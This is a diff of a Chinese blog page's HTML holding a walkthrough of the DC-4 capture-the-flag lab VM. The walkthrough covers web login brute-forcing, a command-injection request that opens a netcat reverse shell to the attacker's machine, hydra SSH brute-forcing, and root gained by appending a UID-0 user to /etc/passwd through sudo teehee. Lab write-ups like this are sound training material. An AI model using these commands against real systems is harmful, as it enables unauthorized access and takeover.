@@ -281,14 +281,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>9.7k</span>
+              <span>9.1k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>9 分钟</span>
+              <span>8 分钟</span>
             </span>
             <div class="post-description"> </div>
 
@@ -305,161 +305,278 @@
 <li>环境</li>
 </ul>
 <blockquote>
-<p>网段 192.168.18.0/24<br>kali   192.168.18.131<br>靶机 192.168.18.135</p>
+<p>网段 192.168.18.0/24 kali 192.168.18.131 靶机 192.168.18.135</p>
 </blockquote>
 <p>nmap扫描网段</p>
 <blockquote>
-<p>kali@kali2020:~/Tools$ sudo nmap 192.168.18.0/24 -sn<br>Starting Nmap 7.91 ( <a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-02 11:06 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00038s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.135<br>Host is up (0.00022s latency).<br>MAC Address: 00:0C:29:19:21:2F (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00016s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.15 seconds</p>
+<p>kali@kali2020:~/Tools$ sudo nmap 192.168.18.0/24 -sn Starting Nmap
+7.91 ( https://nmap.org ) at 2021-05-02 11:06 CST Nmap scan report for
+192.168.18.2 Host is up (0.00038s latency). MAC Address:
+00:50:56:E0:DA:9A (VMware) Nmap scan report for 192.168.18.135 Host is
+up (0.00022s latency). MAC Address: 00:0C:29:19:21:2F (VMware) Nmap scan
+report for 192.168.18.254 Host is up (0.00016s latency). MAC Address:
+00:50:56:E1:37:77 (VMware) Nmap scan report for 192.168.18.131 Host is
+up. Nmap done: 256 IP addresses (4 hosts up) scanned in 2.15 seconds</p>
 </blockquote>
 <p>nmap扫描靶机开放的端口</p>
 <blockquote>
-<p>kali@kali2020:~/Tools$ sudo nmap 192.168.18.135 -p- -sV<br>Starting Nmap 7.91 ( <a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-02 11:09 CST<br>Nmap scan report for 192.168.18.135<br>Host is up (0.0015s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>80/tcp open  http    nginx 1.15.10<br>MAC Address: 00:0C:29:19:21:2F (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
-<p>Service detection performed. Please report any incorrect results at <a target="_blank" rel="noopener" href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 7.86 seconds</p>
+<p>kali@kali2020:~/Tools$ sudo nmap 192.168.18.135 -p- -sV Starting Nmap
+7.91 ( https://nmap.org ) at 2021-05-02 11:09 CST Nmap scan report for
+192.168.18.135 Host is up (0.0015s latency). Not shown: 65533 closed
+ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian
+10+deb9u6 (protocol 2.0) 80/tcp open http nginx 1.15.10 MAC Address:
+00:0C:29:19:21:2F (VMware) Service Info: OS: Linux; CPE:
+cpe:/o:linux:linux_kernel</p>
+<p>Service detection performed. Please report any incorrect results at
+https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned
+in 7.86 seconds</p>
 </blockquote>
 <p>dirsearch扫一下目录</p>
 <blockquote>
-<p>kali@kali2020:~/Tools/dirsearch$ sudo python3 dirsearch.py -u 192.168.18.135 </p>
-<p>[11:14:19] Starting:<br>[11:14:25] 302 -  704B  - /command.php  -&gt;  index.php<br>[11:14:25] 301 -  170B  - /css  -&gt;  <a target="_blank" rel="noopener" href="http://192.168.18.135/css/">http://192.168.18.135/css/</a><br>[11:14:26] 301 -  170B  - /images  -&gt;  <a target="_blank" rel="noopener" href="http://192.168.18.135/images/">http://192.168.18.135/images/</a><br>[11:14:26] 403 -  556B  - /images/<br>[11:14:26] 200 -  506B  - /index.php<br>[11:14:27] 302 -  206B  - /login.php  -&gt;  index.php<br>[11:14:27] 302 -  163B  - /logout.php  -&gt;  index.php</p>
+<p>kali@kali2020:~/Tools/dirsearch$ sudo python3 dirsearch.py -u
+192.168.18.135</p>
+<p>[11:14:19] Starting: [11:14:25] 302 - 704B - /command.php -&gt;
+index.php<br>
+[11:14:25] 301 - 170B - /css -&gt; http://192.168.18.135/css/<br>
+[11:14:26] 301 - 170B - /images -&gt;
+http://192.168.18.135/images/<br>
+[11:14:26] 403 - 556B - /images/ [11:14:26] 200 - 506B -
+/index.php<br>
+[11:14:27] 302 - 206B - /login.php -&gt; index.php<br>
+[11:14:27] 302 - 163B - /logout.php -&gt; index.php</p>
 </blockquote>
 <p>进主页看到一个登录框</p>
 <p><img src="/posts/d8125b4/index.png"></p>
 <p>burp爆破admin得到密码<code>happy</code></p>
 <p>登录后发现可以执行一些命令</p>
-<p><img src="/posts/d8125b4/command.png"><br>burp抓包看一下<br><img src="/posts/d8125b4/burp_whoami.png"><br><br><br><img src="/posts/d8125b4/burp_catpasswd.png"><br><br><br>反弹shell<br><img src="/posts/d8125b4/kali_nc.png"></p>
-<blockquote>
-<p>kali@kali2020:~$ nc -lvp 8888</p>
-</blockquote>
-<p>burp改包<br><img src="/posts/d8125b4/burp_nc.png"><br>radio=nc -e /bin/sh 192.168.18.131 8888 &amp;submit=Run</p>
-<p>使用python得到交互式shell<br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br><img src="/posts/d8125b4/shell.png"></p>
-<blockquote>
-<p>kali@kali2020:~$ nc -lvp 8888<br>listening on [any] 8888 …<br>192.168.18.135: inverse host lookup failed: Unknown host<br>connect to [192.168.18.131] from (UNKNOWN) [192.168.18.135] 48192<br>python -c ‘import pty;pty.spawn(“/bin/bash”)’<br>www-data@dc-4:/usr/share/nginx/html$ whoami<br>whoami<br>www-data<br>www-data@dc-4:/usr/share/nginx/html$ </p>
-</blockquote>
+<p><img src="/posts/d8125b4/command.png"> burp抓包看一下 <img src="/posts/d8125b4/burp_whoami.png"> <br> <img src="/posts/d8125b4/burp_catpasswd.png"> <br>
+反弹shell <img src="/posts/d8125b4/kali_nc.png"> &gt; kali@kali2020:~$ nc -lvp
+8888</p>
+<p>burp改包 <img src="/posts/d8125b4/burp_nc.png"> radio=nc -e /bin/sh 192.168.18.131
+8888 &amp;submit=Run</p>
+<p>使用python得到交互式shell
+<code>python -c 'import pty;pty.spawn("/bin/bash")'</code> <img src="/posts/d8125b4/shell.png"> &gt; kali@kali2020:~$ nc -lvp 8888 listening on [any]
+8888 ... 192.168.18.135: inverse host lookup failed: Unknown host
+connect to [192.168.18.131] from (UNKNOWN) [192.168.18.135] 48192 python
+-c 'import pty;pty.spawn("/bin/bash")'
+www-data@dc-4:/usr/share/nginx/html$ whoami whoami www-data
+www-data@dc-4:/usr/share/nginx/html$</p>
 <p><code>cat /etc/passwd</code></p>
 <p>发现有三个用户</p>
 <blockquote>
-<p>charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash<br>jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash<br>sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash</p>
+<p>charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash
+jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash
+sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash</p>
 </blockquote>
 <p>看下charles用户有什么</p>
 <blockquote>
-<p>**www-data@dc-4:/home$ cd charles **</p>
-<p>cd charles<br><strong>www-data@dc-4:/home/charles$ ls</strong><br>ls<br><strong>www-data@dc-4:/home/charles$ ls -l</strong><br>ls -l<br>total 0<br><strong>www-data@dc-4:/home/charles$ cd ls</strong><br>cd ls<br>bash: cd: ls: No such file or directory<br><strong>www-data@dc-4:/home/charles$ cat ls</strong><br>cat ls<br>cat: ls: No such file or directory<br>**www-data@dc-4:/home/charles$ **</p>
+<p><strong>www-data@dc-4:/home$ cd charles </strong></p>
+<p>cd charles<br>
+<strong>www-data@dc-4:/home/charles$ ls</strong><br>
+ls <strong>www-data@dc-4:/home/charles$ ls -l</strong> ls -l total 0
+<strong>www-data@dc-4:/home/charles$ cd ls</strong> cd ls bash: cd: ls:
+No such file or directory <strong>www-data@dc-4:/home/charles$ cat
+ls</strong> cat ls cat: ls: No such file or directory
+<strong>www-data@dc-4:/home/charles$ </strong></p>
 </blockquote>
 <p>查看jim用户有什么,mbox没权限访问</p>
 <blockquote>
-<p>**www-data@dc-4:~$ cd /home/jim  **<br>cd /home/jim<br><strong>www-data@dc-4:/home/jim$ ls</strong><br>ls<br>backups  mbox  test.sh</p>
-<p><strong>www-data@dc-4:/home/jim$ cat mbox</strong><br>cat mbox<br>cat: mbox: Permission denied<br>**www-data@dc-4:/home/jim$ **<br><strong>www-data@dc-4:/home/jim$ cd backups</strong><br>cd backups<br><strong>www-data@dc-4:/home/jim/backups$ ls</strong><br>ls<br>old-passwords.bak<br><strong>www-data@dc-4:/home/jim/backups$ cat old-passwords.bak</strong><br>cat old-passwords.bak</p>
-<p>… … </p>
+<p><strong>www-data@dc-4:~$ cd /home/jim </strong><br>
+cd /home/jim <strong>www-data@dc-4:/home/jim$ ls</strong> ls backups
+mbox test.sh</p>
+<p><strong>www-data@dc-4:/home/jim$ cat mbox</strong><br>
+cat mbox<br>
+cat: mbox: Permission denied<br>
+<strong>www-data@dc-4:/home/jim$ </strong><br>
+<strong>www-data@dc-4:/home/jim$ cd backups</strong> cd backups
+<strong>www-data@dc-4:/home/jim/backups$ ls</strong> ls
+old-passwords.bak <strong>www-data@dc-4:/home/jim/backups$ cat
+old-passwords.bak</strong> cat old-passwords.bak</p>
+<p>... ...</p>
 </blockquote>
 <p>把密码保存在dc4_passwd.txt</p>
 <blockquote>
-<p>kali@kali2020:~/Tools$ sudo hydra -l jim -P ~/Tools/dc4_passwd.txt ssh://192.168.18.135</p>
-<p>Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</p>
-<p>Hydra (<a target="_blank" rel="noopener" href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a>) starting at 2021-05-02 22:25:29<br>[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 253 login tries (l:1/p:253), ~16 tries per task<br>[DATA] attacking ssh://192.168.18.135:22/<br>[STATUS] 181.00 tries/min, 181 tries in 00:01h, 77 to do in 00:01h, 16 active</p>
-<p>[22][ssh] host: 192.168.18.135   login: jim   password: jibril04<br>1 of 1 target successfully completed, 1 valid password found<br>[WARNING] Writing restore file because 4 final worker threads did not complete until end.<br>[ERROR] 4 targets did not resolve or could not be connected<br>[ERROR] 0 target did not complete<br>Hydra (<a target="_blank" rel="noopener" href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a>) finished at 2021-05-02 22:27:02</p>
+<p>kali@kali2020:~/Tools$ sudo hydra -l jim -P ~/Tools/dc4_passwd.txt
+ssh://192.168.18.135</p>
+<p>Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please
+do not use in military or secret service organizations, or for illegal
+purposes (this is non-binding, these *** ignore laws and ethics
+anyway).</p>
+<p>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at
+2021-05-02 22:25:29 [WARNING] Many SSH configurations limit the number
+of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 253 login tries
+(l:1/p:253), ~16 tries per task [DATA] attacking
+ssh://192.168.18.135:22/ [STATUS] 181.00 tries/min, 181 tries in 00:01h,
+77 to do in 00:01h, 16 active</p>
+<p>[22][ssh] host: 192.168.18.135 login: jim password: jibril04 1 of 1
+target successfully completed, 1 valid password found [WARNING] Writing
+restore file because 4 final worker threads did not complete until end.
+[ERROR] 4 targets did not resolve or could not be connected [ERROR] 0
+target did not complete Hydra
+(https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-02
+22:27:02</p>
 </blockquote>
 <p>得到 <code>jim  jibril04</code></p>
 <p>连接ssh</p>
 <blockquote>
-<p><strong>kali@kali2020:~/Tools$ ssh <a href="mailto:&#106;&#105;&#x6d;&#x40;&#49;&#57;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#49;&#x38;&#46;&#49;&#x33;&#x35;">&#106;&#105;&#x6d;&#x40;&#49;&#57;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#49;&#x38;&#46;&#49;&#x33;&#x35;</a></strong></p>
-<p>The authenticity of host ‘192.168.18.135 (192.168.18.135)’ can’t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added ‘192.168.18.135’ (ECDSA) to the list of known hosts.<br><a href="mailto:&#106;&#x69;&#109;&#x40;&#49;&#x39;&#50;&#x2e;&#49;&#54;&#56;&#x2e;&#49;&#x38;&#46;&#49;&#51;&#53;">&#106;&#x69;&#109;&#x40;&#49;&#x39;&#50;&#x2e;&#49;&#54;&#56;&#x2e;&#49;&#x38;&#46;&#49;&#51;&#53;</a>‘s password:<br>Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686</p>
-<p>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms for each program are described in the<br>individual files in /usr/share/doc/*/copyright.</p>
-<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>You have mail.<br>Last login: Sun Apr  7 02:23:55 2019 from 192.168.0.100</p>
+<p><strong>kali@kali2020:~/Tools$ ssh jim@192.168.18.135</strong></p>
+<p>The authenticity of host '192.168.18.135 (192.168.18.135)' can't be
+established. ECDSA key fingerprint is
+SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww. Are you sure you
+want to continue connecting (yes/no/[fingerprint])? yes Warning:
+Permanently added '192.168.18.135' (ECDSA) to the list of known hosts.
+jim@192.168.18.135's password: Linux dc-4 4.9.0-3-686 #1 SMP Debian
+4.9.30-2+deb9u5 (2017-09-19) i686</p>
+<p>The programs included with the Debian GNU/Linux system are free
+software; the exact distribution terms for each program are described in
+the individual files in /usr/share/doc/*/copyright.</p>
+<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law. You have mail. Last login: Sun Apr 7
+02:23:55 2019 from 192.168.0.100</p>
 <p><strong>jim@dc-4:~$ pwd</strong></p>
 <p>/home/jim</p>
 <p>##看看有什么可以使用的root权限命令</p>
 <p><strong>jim@dc-4:~$ sudo -l</strong></p>
-<p>We trust you have received the usual lecture from the local System<br>Administrator. It usually boils down to these three things:</p>
+<p>We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#1) Respect the privacy of others.</span><br><span class="line">#2) Think before you type.</span><br><span class="line">#3) With great power comes great responsibility.</span><br></pre></td></tr></table></figure>
-
-<p>[sudo] password for jim:<br>Sorry, try again.<br>[sudo] password for jim:<br>Sorry, user jim may not run sudo on dc-4.<br>**jim@dc-4:~$ **</p>
-<p><strong>jim@dc-4:~$ ls -l</strong><br>total 12<br>drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups<br>-rw——- 1 jim jim  528 Apr  6  2019 mbox<br>-rwsrwxrwx 1 jim jim  174 Apr  6  2019 test.sh<br><strong>jim@dc-4:~$ cat mbox</strong></p>
-<p>From root@dc-4 Sat Apr 06 20:20:04 2019<br>Return-path: &lt;root@dc-4&gt;<br>Envelope-to: jim@dc-4<br>Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000<br>Received: from root by dc-4 with local (Exim 4.89)<br>        (envelope-from &lt;root@dc-4&gt;)<br>        id 1hCiQe-0000gc-EC<br>        for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000<br>To: jim@dc-4<br>Subject: Test<br>MIME-Version: 1.0<br>Content-Type: text/plain; charset=”UTF-8”<br>Content-Transfer-Encoding: 8bit<br>Message-Id: &lt;E1hCiQe-0000gc-EC@dc-4&gt;<br>From: root &lt;root@dc-4&gt;<br>Date: Sat, 06 Apr 2019 20:20:04 +1000<br>Status: RO</p>
+<p>[sudo] password for jim: Sorry, try again. [sudo] password for jim:
+Sorry, user jim may not run sudo on dc-4. <strong>jim@dc-4:~$
+</strong></p>
+<p><strong>jim@dc-4:~$ ls -l</strong> total 12 drwxr-xr-x 2 jim jim 4096
+Apr 7 2019 backups -rw------- 1 jim jim 528 Apr 6 2019 mbox -rwsrwxrwx 1
+jim jim 174 Apr 6 2019 test.sh <strong>jim@dc-4:~$ cat mbox</strong></p>
+<p>From root@dc-4 Sat Apr 06 20:20:04 2019 Return-path: <a href="mailto:root@dc-4" class="email">root@dc-4</a> Envelope-to:
+jim@dc-4 Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000 Received: from
+root by dc-4 with local (Exim 4.89) (envelope-from <a href="mailto:root@dc-4" class="email">root@dc-4</a>) id 1hCiQe-0000gc-EC
+for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000 To: jim@dc-4 Subject: Test
+MIME-Version: 1.0 Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: 8bit Message-Id: <a href="mailto:E1hCiQe-0000gc-EC@dc-4" class="email">E1hCiQe-0000gc-EC@dc-4</a> From: root <a href="mailto:root@dc-4" class="email">root@dc-4</a> Date: Sat, 06 Apr
+2019 20:20:04 +1000 Status: RO</p>
 <p>This is a test.</p>
 </blockquote>
 <p>可以看到jim发了一条电子邮件</p>
 <p>去看一下./var/mail</p>
 <blockquote>
-<p><strong>jim@dc-4:~$ cd /var/mail</strong><br><strong>jim@dc-4:/var/mail$ ls</strong><br>jim<br><strong>jim@dc-4:/var/mail$ cd jim</strong><br>-bash: cd: jim: Not a directory<br><strong>jim@dc-4:/var/mail$ cat jim</strong><br>From charles@dc-4 Sat Apr 06 21:15:46 2019<br>Return-path: &lt;charles@dc-4&gt;<br>Envelope-to: jim@dc-4<br>Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000<br>Received: from charles by dc-4 with local (Exim 4.89)<br>        (envelope-from &lt;charles@dc-4&gt;)<br>        id 1hCjIX-0000kO-Qt<br>        for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000<br>To: jim@dc-4<br>Subject: Holidays<br>MIME-Version: 1.0<br>Content-Type: text/plain; charset=”UTF-8”<br>Content-Transfer-Encoding: 8bit<br>Message-Id: &lt;E1hCjIX-0000kO-Qt@dc-4&gt;<br>From: Charles &lt;charles@dc-4&gt;<br>Date: Sat, 06 Apr 2019 21:15:45 +1000<br>Status: O</p>
+<p><strong>jim@dc-4:~$ cd /var/mail</strong> <strong>jim@dc-4:/var/mail$
+ls</strong> jim <strong>jim@dc-4:/var/mail$ cd jim</strong> -bash: cd:
+jim: Not a directory <strong>jim@dc-4:/var/mail$ cat jim</strong> From
+charles@dc-4 Sat Apr 06 21:15:46 2019 Return-path: <a href="mailto:charles@dc-4" class="email">charles@dc-4</a> Envelope-to:
+jim@dc-4 Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000 Received: from
+charles by dc-4 with local (Exim 4.89) (envelope-from <a href="mailto:charles@dc-4" class="email">charles@dc-4</a>) id
+1hCjIX-0000kO-Qt for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000 To:
+jim@dc-4 Subject: Holidays MIME-Version: 1.0 Content-Type: text/plain;
+charset="UTF-8" Content-Transfer-Encoding: 8bit Message-Id: <a href="mailto:E1hCjIX-0000kO-Qt@dc-4" class="email">E1hCjIX-0000kO-Qt@dc-4</a> From: Charles <a href="mailto:charles@dc-4" class="email">charles@dc-4</a> Date: Sat, 06
+Apr 2019 21:15:45 +1000 Status: O</p>
 <p>Hi Jim,</p>
-<p>I’m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.</p>
-<p>Password is:  <strong>^xHhA&amp;hvim0y</strong></p>
-<p>See ya,<br>Charles</p>
-<p>**jim@dc-4:/var/mail$ **</p>
+<p>I'm heading off on holidays at the end of today, so the boss asked me
+to give you my password just in case anything goes wrong.</p>
+<p>Password is: <strong>^xHhA&amp;hvim0y</strong></p>
+<p>See ya, Charles</p>
+<p><strong>jim@dc-4:/var/mail$ </strong></p>
 </blockquote>
 <p>发现了Charles的密码<code>^xHhA&amp;hvim0y</code></p>
 <p>su看看能否切换到charles</p>
 <blockquote>
 <p><strong>jim@dc-4:~$ su charles</strong></p>
-<p>Password:<br>**charles@dc-4:/home/jim$ **</p>
+<p>Password: <strong>charles@dc-4:/home/jim$ </strong></p>
 </blockquote>
 <p>看看Charles有什么可以使用的root命令</p>
 <blockquote>
-<p><strong>charles@dc-4:~$ sudo -l</strong><br>Matching Defaults entries for charles on dc-4:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
-<p>User charles may run the following commands on dc-4:<br>    (root) NOPASSWD: /usr/bin/teehee<br>**charles@dc-4:~$ **</p>
+<p><strong>charles@dc-4:~$ sudo -l</strong> Matching Defaults entries
+for charles on dc-4: env_reset, mail_badpass,
+secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
+<p>User charles may run the following commands on dc-4: (root) NOPASSWD:
+/usr/bin/teehee <strong>charles@dc-4:~$ </strong></p>
 </blockquote>
 <p>发现可以不使用密码就能执行<code>teehee</code></p>
 <p>搜了一下 可以利用<code>teehee</code>进行提权</p>
 <blockquote>
-<p>teehee可通过echo “xxx”|sudo teehee -a ‘file’的方式将内容写入到用户无法直接操作的文件中</p>
+<p>teehee可通过echo "xxx"|sudo teehee -a
+'file'的方式将内容写入到用户无法直接操作的文件中</p>
 </blockquote>
 <p><img src="/posts/d8125b4/teeheeuser.png"></p>
-<p>charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash<br>jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash<br>sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash</p>
+<p>charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash
+jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash
+sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash</p>
 <p>七个字段</p>
 <p>root:x:0:0:root:/root:/bin/bash</p>
 <p>Mamor:x:0:0:::/bin/bash</p>
-<p><code>echo &quot;Mamor:x:0:0:::/bin/bash&quot; |sudo teehee -a /etc/passwd</code></p>
+<p><code>echo "Mamor:x:0:0:::/bin/bash" |sudo teehee -a /etc/passwd</code></p>
 <blockquote>
-<p>charles@dc-4:<del>$ echo “Mamor:x:0:0:::/bin/bash” |sudo teehee -a /etc/passwd<br>Mamor:x:0:0:::/bin/bash<br>charles@dc-4:\</del>$ ssh <a href="mailto:&#77;&#97;&#109;&#111;&#114;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#49;&#x38;&#46;&#x31;&#x33;&#x35;">&#77;&#97;&#109;&#111;&#114;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#49;&#x38;&#46;&#x31;&#x33;&#x35;</a><br>The authenticity of host ‘192.168.18.135 (192.168.18.135)’ can’t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no)? yes<br>Warning: Permanently added ‘192.168.18.135’ (ECDSA) to the list of known hosts.<br><a href="mailto:&#77;&#x61;&#x6d;&#x6f;&#114;&#x40;&#49;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#49;&#x38;&#46;&#49;&#x33;&#53;">&#77;&#x61;&#x6d;&#x6f;&#114;&#x40;&#49;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#49;&#x38;&#46;&#49;&#x33;&#53;</a>‘s password:<br>Permission denied, please try again.<br><a href="mailto:&#x4d;&#x61;&#x6d;&#111;&#114;&#x40;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x31;&#x38;&#46;&#x31;&#51;&#x35;">&#x4d;&#x61;&#x6d;&#111;&#114;&#x40;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x31;&#x38;&#46;&#x31;&#51;&#x35;</a>‘s password: </p>
-<p>charles@dc-4:~$ su Mamor<br>Password:<br>su: Authentication failure<br>charles@dc-4:~$ </p>
+<p>charles@dc-4:~$ echo "Mamor:x:0:0:::/bin/bash" |sudo teehee -a
+/etc/passwd Mamor:x:0:0:::/bin/bash charles@dc-4:~$ ssh
+Mamor@192.168.18.135 The authenticity of host '192.168.18.135
+(192.168.18.135)' can't be established. ECDSA key fingerprint is
+SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww. Are you sure you
+want to continue connecting (yes/no)? yes Warning: Permanently added
+'192.168.18.135' (ECDSA) to the list of known hosts.
+Mamor@192.168.18.135's password: Permission denied, please try again.
+Mamor@192.168.18.135's password:</p>
+<p>charles@dc-4:~$ su Mamor Password: su: Authentication failure
+charles@dc-4:~$</p>
 </blockquote>
 <p>构造失败，重新构造一个</p>
 <blockquote>
-<p><strong>charles@dc-4:~$ echo “Mamor111::0:0:::/bin/bash” |sudo teehee -a /etc/passwd</strong></p>
-<p>………….</p>
+<p><strong>charles@dc-4:~$ echo "Mamor111::0:0:::/bin/bash" |sudo teehee
+-a /etc/passwd</strong></p>
+<p>.............</p>
 <p>Mamor111::0:0:::/bin/bash</p>
-<p><strong>charles@dc-4:~$ echo “Mamor111::0:0:::/bin/bash” |sudo teehee -a /etc/passwd</strong></p>
-<p>Mamor111::0:0:::/bin/bash<br><strong>charles@dc-4:~$ su Mamor111</strong></p>
-<p><strong>root@dc-4:/home/charles# ls</strong><br><strong>root@dc-4:/home/charles# cd ../</strong><br><strong>root@dc-4:/home# ls</strong><br>charles  jim  sam<br><strong>root@dc-4:/home# cd ../</strong><br><strong>root@dc-4:/# ls</strong><br>bin   etc         initrd.img.old  media  proc  sbin  tmp  vmlinuz<br>boot  home        lib             mnt    root  srv   usr  vmlinuz.old<br>dev   initrd.img  lost+found      opt    run   sys   var<br><strong>root@dc-4:/# cd root</strong><br><strong>root@dc-4:/root# ls</strong><br>flag.txt<br><strong>root@dc-4:/root# cat flag.txt</strong></p>
-<p>888       888          888 888      8888888b.                             888 888 888 888<br>888   o   888          888 888      888  “Y88b                            888 888 888 888<br>888  d8b  888          888 888      888    888                            888 888 888 888<br>888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888<br>888d88888b888 d8P  Y8b 888 888      888    888 d88””88b 888 “88b d8P  Y8b 888 888 888 888<br>88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P<br>8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      “   “   “   “<br>888P     Y888  “Y8888  888 888      8888888P”   “Y88P”  888  888  “Y8888  888 888 888 888 </p>
+<p><strong>charles@dc-4:~$ echo "Mamor111::0:0:::/bin/bash" |sudo teehee
+-a /etc/passwd</strong></p>
+<p>Mamor111::0:0:::/bin/bash <strong>charles@dc-4:~$ su
+Mamor111</strong></p>
+<p><strong>root@dc-4:/home/charles# ls</strong>
+<strong>root@dc-4:/home/charles# cd ../</strong>
+<strong>root@dc-4:/home# ls</strong> charles jim sam
+<strong>root@dc-4:/home# cd ../</strong> <strong>root@dc-4:/#
+ls</strong> bin etc initrd.img.old media proc sbin tmp vmlinuz boot home
+lib mnt root srv usr vmlinuz.old dev initrd.img lost+found opt run sys
+var <strong>root@dc-4:/# cd root</strong> <strong>root@dc-4:/root#
+ls</strong> flag.txt <strong>root@dc-4:/root# cat flag.txt</strong></p>
+<p>888 888 888 888 8888888b. 888 888 888 888 888 o 888 888 888 888 "Y88b
+888 888 888 888 888 d8b 888 888 888 888 888 888 888 888 888 888 d888b
+888 .d88b. 888 888 888 888 .d88b. 88888b. .d88b. 888 888 888 888
+888d88888b888 d8P Y8b 888 888 888 888 d88""88b 888 "88b d8P Y8b 888 888
+888 888 88888P Y88888 88888888 888 888 888 888 888 888 888 888 88888888
+Y8P Y8P Y8P Y8P 8888P Y8888 Y8b. 888 888 888 .d88P Y88..88P 888 888 Y8b.
+" " " "<br>
+888P Y888 "Y8888 888 888 8888888P" "Y88P" 888 888 "Y8888 888 888 888
+888</p>
 <p>Congratulations!!!</p>
-<p>Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those<br>who have provided feedback, and who have taken time to complete these little<br>challenges.</p>
-<p>If you enjoyed this CTF, send me a tweet via @DCAU7.<br>**root@dc-4:/root# **</p>
+<p>Hope you enjoyed DC-4. Just wanted to send a big thanks out there to
+all those who have provided feedback, and who have taken time to
+complete these little challenges.</p>
